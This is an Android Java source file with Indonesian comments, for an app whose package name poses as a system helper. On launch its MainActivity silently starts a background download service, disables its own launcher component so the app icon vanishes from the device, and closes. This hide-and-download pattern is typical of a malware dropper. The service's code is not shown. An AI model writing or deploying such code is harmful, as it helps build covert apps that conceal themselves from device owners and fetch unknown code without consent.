package com.sys.helper.service;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Mulai service download
        startService(new Intent(this, DownloadService.class));
        // Sembunyikan ikon
        PackageManager pm = getPackageManager();
        ComponentName alias = new ComponentName(this, getPackageName() + ".MainActivityAlias");
        // Karena tidak ada alias, kita disable komponen utama
        pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();
    }
}
